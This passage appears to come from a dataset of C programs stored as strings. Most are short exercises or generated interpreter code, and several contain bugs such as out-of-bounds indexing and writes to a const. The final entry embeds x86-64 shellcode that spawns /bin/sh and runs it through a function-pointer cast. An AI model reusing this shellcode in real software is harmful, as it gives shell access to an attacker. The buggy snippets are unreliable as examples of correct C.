ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=6;while (tape[ptr]) {tape[ptr]-=1;}ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=7;tape[ptr]+=1;ptr-=6;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=2;while (tape[ptr]) {tape[ptr]-=1;}ptr-=3;while (tape[ptr]) {ptr+=3;tape[ptr]+=1;ptr-=2;tape[ptr]+=1;ptr-=1;tape[ptr]-=1;}ptr+=1;while (tape[ptr]) {ptr-=1;tape[ptr]+=1;ptr+=1;tape[ptr]-=1;}ptr+=2;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=7;while (tape[ptr]) {ptr-=7;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=6;tape[ptr]-=1;}ptr-=6;while (tape[ptr]) {ptr+=6;tape[ptr]+=1;ptr-=6;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];free_mem(tape, ptr, taken_cells);while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=3;while (tape[ptr]) {ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=2;tape[ptr]-=1;}ptr-=2;while (tape[ptr]) {ptr+=2;tape[ptr]+=1;ptr-=2;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=3;while (tape[ptr]) {tape[ptr]-=1;}ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=4;tape[ptr]+=1;ptr-=3;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;tape[ptr]+=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ptr+=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr-=4;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]+=1;ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr-=3;while (tape[ptr]) {ptr+=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr-=3;tape[ptr]-=1;}ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];printf(\"%d\", tape[ptr]);ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]+=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {tape[ptr]-=1;}ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=10;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];putchar(tape[ptr]);ptr = ref_tape[--ref_ptr];tape[ptr]-=1;tape[ptr]-=1;ptr+=1;while (tape[ptr]) {tape[ptr]-=1;}ptr+=2;while (tape[ptr]) {tape[ptr]-=1;}ptr-=3;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];while (tape[ptr]) {ptr = ref_tape[--ref_ptr];ptr+=3;tape[ptr]+=1;ptr-=2;tape[ptr]+=1;ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]-=1;ptr = ref_tape[--ref_ptr];ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];}ptr = ref_tape[--ref_ptr];ptr+=1;while (tape[ptr]) {ptr-=1;ref_tape[ref_ptr++] = ptr; ptr = tape[ptr];tape[ptr]+=1;ptr = ref_tape[--ref_ptr];ptr+=1;tape[ptr]-=1;}ptr-=1;tape[ptr]-=1;ptr+=7;while (tape[ptr]) {tape[ptr]-=1;}ptr-=7; }",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <strings.h>\n#include <math.h>\n#include <ctype.h>\nint main()\n{\n    long long int ara[7] = {6,28,496,8128,33550336,8589869056,137438691328};\n    int n,i,j;\n    scanf(\"%d\", &n);\n    for(i = 0;i < n;i++)\n    {\n        long long int t,flag = 0;\n        scanf(\"%lld\", &t);\n        for(j = 0;j < 7;j++)\n        {\n            if(ara[j] <= t)\n            {\n                printf(\"%lld\\n\",ara[j]);\n            }\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int N[13], contador = 0, A=0;\n    scanf(\"%d\", &A);\n    N[0]=A;\n    for (contador = 1; contador < A; contador++)\n    {\n        N[contador] = N[contador - 1] * (N[0] - contador);\n    }\n    printf(\"%d\\n\", N[A-1]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  float l, h;\n  printf(\"AREA DO RECTANGULO\\nComprimento? \");\n  scanf(\"%f\", &l);\n  printf(\"Altura? \");\n  scanf(\"%f\", &h);\n  float area = l * h;\n  printf(\"A area do rectangulo e: %f.\\n\", area);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar pick_heatmap(int* heatmap) {\n    int i, pos, max = 0;\n    for(i = 0; i <= 'z' - 'a'; i++){\n        if(heatmap[i] > max) {\n            max = heatmap[i];\n            pos = i;\n        }\n    }\n    return pos;\n}\nint main()\n{\n    FILE *fp = fopen(\"input\", \"r\");\n    char data[16];\n    int heatmaps[8][26] = {{0}}, i;\n    if(fp == ((void*)0)) {\n        printf(\"could not open input file\\n\");\n        return -1;\n    }\n    while (fscanf(fp, \"%s\", data) != (-1)) {\n        for(i = 0; i < 8; i++){\n            heatmaps[i][(int)data[i] - 'a']++;\n        }\n    }\n    for(i = 0; i < 8; i++){\n        printf(\"%c\", pick_heatmap(heatmaps[i])+'a');\n    }\n    printf(\"\\n\");\n    fclose(fp);\n    return(0);\n}",
    "#include <assert.h>\n#include <limits.h>\n#include <math.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar* readline();\nchar** split_string(char*);\nint min(int a,int b){\n    return a < b ? a : b;\n}\nlong max(long a,long b){\n    return a > b ? a : b;\n}\nlong largestRectangle_BruteForce(int h_count, int *h)\n{\n    int i, j, height = 0, width;\n    long max_area = (-2147483647 -1);\n    for (i = 0; i < h_count; i++)\n    {\n        height = h[i];\n        for (j = i-1; j >= 0; j--)\n        {\n            width = (i - j + 1);\n            height = min(h[j],height);\n            max_area = max(max_area,height * width);\n        }\n    }\n    return max_area;\n}\nint main()\n{\n    FILE* fptr = fopen(getenv(\"OUTPUT_PATH\"), \"w\");\n    char* n_endptr;\n    char* n_str = readline();\n    int n = strtol(n_str, &n_endptr, 10);\n    if (n_endptr == n_str || *n_endptr != '\\0') { exit(1); }\n    char** h_temp = split_string(readline());\n    int* h = malloc(n * sizeof(int));\n    for (int i = 0; i < n; i++) {\n        char* h_item_endptr;\n        char* h_item_str = *(h_temp + i);\n        int h_item = strtol(h_item_str, &h_item_endptr, 10);\n        if (h_item_endptr == h_item_str || *h_item_endptr != '\\0') { exit(1); }\n        *(h + i) = h_item;\n    }\n    int h_count = n;\n    long result = largestRectangle_BruteForce(h_count, h);\n    fprintf((stdout), \"%ld\\n\", result);\n    return 0;\n}\nchar* readline() {\n    size_t alloc_length = 1024;\n    size_t data_length = 0;\n    char* data = malloc(alloc_length);\n    while (1) {\n        char* cursor = data + data_length;\n        char* line = fgets(cursor, alloc_length - data_length, (stdin));\n        if (!line) { break; }\n        data_length += strlen(cursor);\n        if (data_length < alloc_length - 1 || data[data_length - 1] == '\\n') { break; }\n        size_t new_length = alloc_length << 1;\n        data = realloc(data, new_length);\n        if (!data) { break; }\n        alloc_length = new_length;\n    }\n    if (data[data_length - 1] == '\\n') {\n        data[data_length - 1] = '\\0';\n    }\n    data = realloc(data, data_length);\n    return data;\n}\nchar** split_string(char* str) {\n    char** splits = ((void*)0);\n    char* token = strtok(str, \" \");\n    int spaces = 0;\n    while (token) {\n        splits = realloc(splits, sizeof(char*) * ++spaces);\n        if (!splits) {\n            return splits;\n        }\n        splits[spaces - 1] = token;\n        token = strtok(((void*)0), \" \");\n    }\n    return splits;\n}",
    "#include <stdio.h>\nint main (void) {\n  char *dig_str[9] = {\n    \"one\", \"two\", \"three\", \"four\", \"five\", \"eight\", \"nine\"\n  };\n  int n = 44;\n  printf(\"%s \\n\", dig_str[(n - 1)]);\n  return 0;\n}",
    "#include <stdio.h>\n\n\n\ndouble calculateDifference(int,int,int);\nint main(void)\n{\n    int day=0,month=0,year=0;\n    printf(\"Please enter a date in format dd/mm/yy : \");\n    scanf(\"%d%d%d\",&day,&month,&year);\n    printf(\"Entered date is %.2lf seconds far away from now.\\n\",calculateDifference(day,month,year));\n    return 0;\n}\ndouble calculateDifference(int d, int m, int y)\n{\n    return 24*60*60*(double)(d-21 + (m-2)*30 + (y-2020)*12*30);\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\nconst int MAXLINE = 1000;\nint main (void) {\n  int n;\n  int fd[2];\n  pid_t pid;\n  char line[MAXLINE];\n  int nbytes;\n  if (pipe(fd) < 0) {\n    exit(1);\n  }\n  if ((pid = fork()) < 0) {\n    exit(2);\n  } else if (pid > 0) {\n    close(fd[0]);\n    while (1) {\n      write(fd[1], \"x\", 1);\n    }\n  } else {\n    int i = 0;\n    close(fd[1]);\n    while (1) {\n      usleep(1000);\n      read(fd[0], line, 1);\n      ioctl(fd[0], 1, &nbytes);\n      printf(\"%d\\n\", nbytes);\n    }\n  }\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n char s[100];\n char x = '\\0';\n printf(\"%p\\n\", s);\n printf(\"%d \\n\", x);\n char ch;\n scanf(\"%c\",&ch);\n printf(\"%c*\",ch);\n}",
    "#include<stdio.h>\n#include<limits.h>\nint main(){\n int n, x;\n scanf(\"%d\", &n);\n int nax = -2147483647, nin = 2147483647;\n for(int i=0;i<n;++i){\n  scanf(\"%d\", &x);\n  if(nax < x){\n   nax = x;\n  }\n  if(nin > x){\n   nin = x;\n  }\n }\n printf(\"%d\\n%d\", nin,nax);\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n        unsigned int i = 0;\n        do { printf(\"%o\\n\", i++); } while(i);\n        return 0;\n}",
    "#include <stdlib.h>\n\nint main(void) {\n  double *a;\n  a = calloc(100, sizeof *a);\n  for (size_t i = 0; i < 100; ++i) {\n    a[i] = a[i];\n  }\n  free(a);\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <err.h>\nstatic void child()\n{\n    pid_t cur_pid;\n    cur_pid = getpid();\n    printf(\"expect as child process, is %d\\n\", cur_pid);\n    exit(0);\n}\nstatic void caller(pid_t pid_c)\n{\n    printf(\"expect as parent process, is %d and child expects as %d\\n\", getpid(), pid_c);\n    exit(0);\n}\nint main(void)\n{\n    pid_t ret;\n    ret = fork();\n    if (ret == -1)\n        err(1, \"fork()failed\");\n    else if (ret == 0)\n        child();\n    else\n        caller(ret);\n    err(1, \"totally error\");\n}",
    "#include <stdio.h>\nint sumar(int numero1, int numero2);\nint main(void){\n int suma = sumar(5, 3);\n printf(\"La suma es: %d \\n\", suma);\n return 0;\n}\nint sumar(int numero1, int numero2)\n{\n return numero1 + numero2;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n  char str[100];\n  fgets(str, 100, (stdin));\n  strlen(str);\n}",
    "#include <stdio.h>\nint square(int n);\nint cubed(int n);\nint main(void){\n    int min;\n    int max;\n    int i;\n    printf(\"\u8bf7\u8f93\u5165\u8868\u683c\u884c\u6570\u6700\u5c0f\u503c\uff1a\");\n    scanf(\"%d\",&min);\n    printf(\"\u8bf7\u8f93\u5165\u8868\u683c\u884c\u6570\u6700\u5927\u503c\uff1a\");\n    scanf(\"%d\",&max);\n    for(i = min; i < max; i++){\n        printf(\"%d %d %d\\n\",i,square(i),cubed(i));\n    }\n    return 0;\n}\nint square(int number){\n   return number * number;\n}\nint cubed(int number){\n    return number * number * number;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/types.h>\nint main() {\n    printf(\"A START %d\\n\", getpid());\n    execl(\"./p2b\", \"./p2b\", ((void*)0));\n    printf(\"A STOP %d\\n\", getpid());\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main()\n{\n    char Str[100];\n    unsigned short int j = 0, Tamanho = 0;\n    printf(\"Digite uma palavra: \");\n    scanf(\"%[^\\n]\", Str);\n    fflush((stdin));\n    Tamanho = strlen(Str);\n    char Inverso[Tamanho+1];\n    for (int i = (Tamanho-1) ; i >= 0; i--)\n    {\n        Inverso[j] = Str[i];\n        j++;\n    }\n    Inverso[j] = '\\0';\n    printf(\"Entrada: %s\\n\", Str);\n    printf(\"Inverso: %s\\n\", Inverso);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<unistd.h>\n#include<pthread.h>\n#include<semaphore.h>\nint a = 5, b = 7;\nsem_t mutex;\nvoid* inc_dec(void *arg) {\n sem_wait(&mutex);\n printf(\"Read value of 'a' global variable is: %d\\n\", a);\n printf(\"Read value of 'b' global variable is: %d\\n\", b);\n sleep(1);\n a = a + 1;\n b = b - 1;\n printf(\"Updated value of 'a' variable is: %d\\n\", a);\n printf(\"Updated value of 'b' variable is: %d\\n\", b);\n sem_post(&mutex);\n return ((void*)0);\n}\nint main() {\n sem_init(&mutex, 0, 1);\n pthread_t t1, t2, t3;\n pthread_create(&t1, ((void*)0), inc_dec, ((void*)0));\n pthread_create(&t2, ((void*)0), inc_dec, ((void*)0));\n pthread_create(&t3, ((void*)0), inc_dec, ((void*)0));\n pthread_join(t1, ((void*)0));\n pthread_join(t2, ((void*)0));\n pthread_join(t3, ((void*)0));\n sem_destroy(&mutex);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n    float N=0;\n    int i=1;\n    printf(\" *| Calculo de de la raiz cuadrada entera por defecto |*\\n  \");\n    printf(\" Ingrese un n\u00famero natural N mayor a 0: \");\n    scanf(\"%f\",&N);\n    for(i=1;i*i<=N;i++){\n     i+1;\n     }\n    printf(\"La raiz cuadrada entera es: %d\\n\", i-1);\nreturn 0;\n}",
    "void reach_error(){}\nint main() {\n    _Bool a;\n    unsigned char uc;\n    signed char c;\n    unsigned short us;\n    short s;\n    unsigned int ui;\n    int i;\n    unsigned long ul;\n    long l;\n    unsigned long long ull;\n    long long ll;\n    if(a+uc+c+us+s+ui+i+ul+l+ull+ll) reach_error();\n}",
    "#include <stdio.h>\nint searchInsert(int *nums, int numsSize, int target) {\n    int i = 0;\n    while (target > nums[i] && i < numsSize) {\n        i++;\n    }\n    return i;\n}\nint main() {\n    int arr1[] = {1, 3, 5, 6};\n    printf(\"%d\\n\", searchInsert(arr1, sizeof(arr1) / sizeof(int), 4));\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc,char *argv[]) {\n    const int a = 5;\n    int *p = (int *)&a;\n    *p = 100;\n    printf(\"a = %d\\n\", a);\n    return 0;\n}",
    "int main() {\n  while(1) {\n    break;\n  }\n  while(1) break;\n  for(;;) {\n    1 + 1;\n    break;\n    2 + 2;\n  }\n  int i = 0;\n  for(i = 0; i != 10; i++) {\n    if(i == 5) break;\n    continue;\n    i--;\n  }\n  if(i != 5) return 1;\n  int count = 0;\n  for(i = 0; i != 10; i++) {\n    count++;\n    while(1) {\n      break;\n    }\n  }\n  if(count != 10) return 2;\n}",
    "#include<stdio.h>\nvoid find_closest_flight(int desired_time, int *departure, int *arrival_time);\nint main(void)\n{\n  int hour,minute;\n  int desired_time;\n  int departure;\n  int arrival_time;\n  printf(\"Enter a 24-hour time: \");\n  scanf(\"%d : %d\", &hour, &minute);\n  desired_time = hour*60 + minute;\n  find_closest_flight(desired_time, &departure, &arrival_time);\n  printf(\"closet flight departure time:%d:%.2d \",departure/60,departure-departure/60*60);\n  printf(\"closet flight arrival time:%d:%.2d \",arrival_time/60,arrival_time-arrival_time/60*60);\n}\nvoid find_closest_flight(int desired_time, int *departure, int *arrival_time)\n{\n  int i, temp,result;\n  temp =60*24;\n  int departure_array[]={8 * 60, 9 * 60 + 43, 11 * 60 + 19, 12 * 60 + 47, 14 * 60, 15 * 60 + 45, 19 * 60, 21 * 60 + 45};\n  int arrival_time_array[]= {10 * 60 + 16, 11 * 60 + 52, 13 * 60 + 31, 15 * 60, 16 * 60 + 8, 17 * 60 + 55, 21 * 60 + 20, 23 * 60 + 58};\n  for (i = 0; i < 8; i++)\n  {\n    if (departure_array[i] >= desired_time)\n    {\n      if ((departure_array[i] - desired_time) < temp)\n      {\n        temp = (departure_array[i] - desired_time);\n        result = i;\n      }\n    }\n    else\n    {\n      if ((desired_time-departure_array[i]) < temp)\n      {\n        temp = (desired_time-departure_array[i]);\n        result = i;\n      }\n    }\n  }\n  *departure = departure_array[result];\n  *arrival_time = arrival_time_array[result];\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint cmp(const void* key, const void* member) {\n  return *(int*)key - *(int*)member;\n}\nvoid printResult(int* needle, int* haystack, unsigned int len) {\n  void* result = bsearch(needle, haystack, len, sizeof(unsigned int), cmp);\n  if (result == ((void*)0)) {\n    printf(\"null\\n\");\n  } else {\n    printf(\"%d\\n\", *(unsigned int*)result);\n  }\n}\nint main() {\n  int a[] = {-2, -1, 0, 6, 7, 9};\n  int val = -2;\n  printResult(&val, a, 6);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i = 0;\n  while (i < 100)\n  {\n    printf(\"%d\", i);\n    i++;\n  }\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\nunsigned long int factorial(int, unsigned long int);\nunsigned long int binomial(int, int);\nint main(int argc, char **argv) {\n    int n = 6;\n    float p = 1.09 / (1+1.09);\n    float q = 1 - p;\n    float r = 0.0;\n    for (int i = 3; i <= 6; i++) {\n        r += binomial(n, i)*pow(p, i)*pow(q, (n-i));\n    }\n    printf(\"%.3f\\n\", r);\n    return 0;\n}\nunsigned long int factorial(int n, unsigned long int acc) {\n    if (n == 0) {\n        return acc;\n    }\n    return factorial(n-1, acc*n);\n}\nunsigned long int binomial(int n, int x) {\n    return factorial(n, 1)/(factorial(x, 1)*factorial(n-x, 1));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\nint main()\n{\n    setlocale(6,\"Portuguese\");\n    int i, n;\n    printf(\"Enter a number: \");\n    scanf(\"%d\", &n);\n    for(i = 1; i <= n; i++)\n    {\n        printf(\"%d --- %d\\n\", i, n-i+1);\n    }\n    printf(\"\\n\\n\");\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid allocationCheck(int*);\nvoid inputMatrix(int, int, int*);\nvoid printMatrix(int, int, int*);\nint calMatrix(int*, int*, int*, int, int, int);\nint main()\n{\n    int row1, col1;\n    int row2, col2;\n    int i;\n    printf(\"Please enter the row and col for martix 1\\n\");\n    printf(\"Row: \");\n    scanf(\"%d\", &row1);\n    printf(\"Col: \");\n    scanf(\"%d\", &col1);\n    printf(\"\\n\");\n    printf(\"Please enter the row and col for martix 2\\n\");\n    printf(\"Row: \");\n    scanf(\"%d\", &row2);\n    printf(\"Col: \");\n    scanf(\"%d\", &col2);\n    if (row1 != col2)\n    {\n     printf(\"\\nPlease re-enter your values\\n\");\n }\n    int *matrix1 = (int*)malloc(row1 * col1 * sizeof(int));\n allocationCheck(matrix1);\n printf(\"\\nMatrix 1\\n\");\n inputMatrix(row1, col1, matrix1);\n int *matrix2 = (int*)malloc(row1 * col1 * sizeof(int));\n int *matrix3 = (int*)malloc(row1 * col2 * sizeof(int));\n allocationCheck(matrix2);\n allocationCheck(matrix3);\n printf(\"\\nMatrix 1\\n\");\n    inputMatrix(row2, col2, matrix2);\n calMatrix(matrix1, matrix2, matrix3, row1, col2, col1);\n}\nvoid allocationCheck(int* matrix)\n{\n if (matrix == ((void*)0))\n {\n  printf(\"Error: Allocation fail\\n\");\n  exit(1);\n }\n}\nvoid inputMatrix(int row, int col, int* matrix)\n{\n printf(\"\\nPlease enter values for:\\n\");\n int i;\n int j;\n for (i = 0; i < row; i++)\n {\n  for (j = 0; j < col; j++)\n  {\n   printf(\"Row %d\tCol %d\\n\", i + 1, j + 1);\n   scanf(\"%d\", (matrix + i*col + j));\n  }\n }\n printMatrix(row, col, matrix);\n}\nvoid printMatrix(int row, int col, int* matrix)\n{\n int i, j;\n for (i = 0; i < row; i++)\n {\n  for (j = 0; j < col; j++)\n  {\n   printf(\"%d \", *(matrix + (i * col) + j));\n  }\n  printf(\"\\n\");\n }\n}\nint calMatrix(int* matrix1, int* matrix2, int* final, int row1, int col2, int col1)\n{\n int sum = 0;\n int i, j, k;\n for (i = 0; i < row1; i++)\n {\n  for (j = 0; j < col2; j++)\n  {\n   for (k = 0; k < col1; k++)\n   {\n    sum += *(matrix1 + i * col1 + k) * *(matrix2 + k * col2 + j);\n   }\n   *(final + i * col2 + j) = sum;\n   sum = 0;\n  }\n }\n printMatrix(row1, col2, final);\n}",
    "#include <stdio.h>\nconst char vold[] =\n\"\\x48\\x31\\xc0\\x50\\x5f\\xb0\\x03\\x0f\\x05\"\n\"\\x50\\x48\\xbf\\x2f\\x64\\x65\\x76\\x2f\\x74\\x74\\x79\\x57\\x54\\x5f\\x50\\x5e\\x66\\xbe\\x02\\x27\\xb0\\x02\\x0f\\x05\"\n\"\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x50\\x57\\x54\\x5e\\x48\\x99\\xb0\\x3b\\x0f\\x05\";\nint main(void) {\n    void (*f)() = (void(*)())vold;\n    f();\n}",
